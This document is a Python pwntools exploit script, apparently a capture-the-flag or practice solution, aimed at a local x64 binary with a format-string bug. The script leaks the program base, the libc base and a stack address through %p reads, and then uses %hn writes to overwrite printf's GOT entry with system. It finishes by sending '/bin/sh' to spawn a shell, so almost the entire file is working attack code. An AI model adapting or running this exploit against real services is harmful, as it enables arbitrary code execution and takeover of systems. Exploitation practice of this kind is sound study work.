#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'amd64'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_level_2_x64'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =elf.libc

# 泄露基地址，包含1.文件基地址，2.libc基地址
dem = 'hello\n'
io.recvuntil(dem)
payload4searchbase = b"%9$p\x00"
io.send(payload4searchbase)
main_28 = int(io.recv()[2:14],16)
file_base = main_28 -elf.symbols['main'] -  28
print("file_base is :",hex(file_base))
printf_got = file_base + elf.got["printf"]
payload4searchlibc = b"%11$p\x00"
io.send(payload4searchlibc)
libc_start_main_243 = int(io.recv()[2:14],16)
libc_base = libc_start_main_243 - libc.symbols['__libc_start_main'] -  243
print("libc_base is :",hex(libc_base))
sys_addr = libc_base + libc.symbols["system"]


# 泄露栈地址
payload_search_stack  = b'%6$p\x00'
io.send(payload_search_stack)
stack_offset_1 = -0x8
stack_offset_2 = 0x8
stack_offset_3 = 0x38
stack_offset_4 = 0x50
stack = int(io.recv()[2:14],16)
stack_1 = stack + stack_offset_1
stack_2 = stack + stack_offset_2
stack_3 = stack + stack_offset_3
stack_4 = stack + stack_offset_4


# 修改三链
nu_1 = stack_1 & 0xffff
payload_1 = b"%" + str(nu_1).encode("utf-8") + b"c%6$hn\x00"
io.send( payload_1)
io.interactive()
printf_got_nu_1 = printf_got & 0xffff
payload_1 = b"%" + str(printf_got_nu_1).encode("utf-8") + b"c%8$hn\x00"
io.send(payload_1)
io.interactive()

nu_2 = stack_2 & 0xffff
payload_1 = b"%" + str(nu_2).encode("utf-8") + b"c%6$hn\x00"
io.send( payload_1)
io.interactive()
printf_got_nu_2 = (printf_got + 2) & 0xffff
payload_1 = b"%" + str(printf_got_nu_2).encode("utf-8") + b"c%8$hn\x00"
io.send( payload_1)
# duchao_pwn_script.dbg(io)
io.interactive()

nu_3 = stack_3 & 0xffff
payload_1 = b"%" + str(nu_3).encode("utf-8") + b"c%6$hn\x00"
io.send(payload_1)
# duchao_pwn_script.dbg(io)
io.interactive()
printf_got_nu_3 = (printf_got + 4) & 0xffff
payload_1 = b"%" + str(printf_got_nu_3).encode("utf-8") + b"c%8$hn\x00"
io.send( payload_1)
# duchao_pwn_script.dbg(io)
io.interactive()


nu_4 = stack_4 & 0xffff
payload_1 = b"%" + str(nu_4).encode("utf-8") + b"c%6$hn\x00"
io.send( payload_1)
io.interactive()
printf_got_nu_2 = (printf_got + 6)& 0xffff
payload_1 = b"%" + str(printf_got_nu_2).encode("utf-8") + b"c%8$hn\x00"
io.send( payload_1)
# duchao_pwn_script.dbg(io)
io.interactive()


sys_addr_1 = sys_addr & 0xffff
sys_addr_2 = (sys_addr >> 16)& 0xffff
sys_addr_3 = (sys_addr >> 32)& 0xffff
sys_addr_4 = (sys_addr >> 48)& 0xffff
print("system is :",hex(sys_addr))
print("system_addr1 is :",hex(sys_addr_1))
print("system_addr2 is :",hex(sys_addr_2))
print("system_addr3 is :",hex(sys_addr_3))
print("system_addr4 is :",hex(sys_addr_4))
pause()


# 一次性修改got表项
payload = b"%" + str(sys_addr_1).encode("utf-8") +  b"c%7$hn" 
payload += b"%" + str(0x10000 + sys_addr_2 - sys_addr_1).encode("utf-8") + b"c%9$hn" 
payload += b"%" + str(0x10000 + sys_addr_3 - sys_addr_2).encode("utf-8") + b"c%15$hn"
payload += b"\x00"
io.send(payload)
duchao_pwn_script.dbg(io)
io.interactive()

#发送/bin/sh
io.send( b'/bin/sh\x00')
io.interactive()

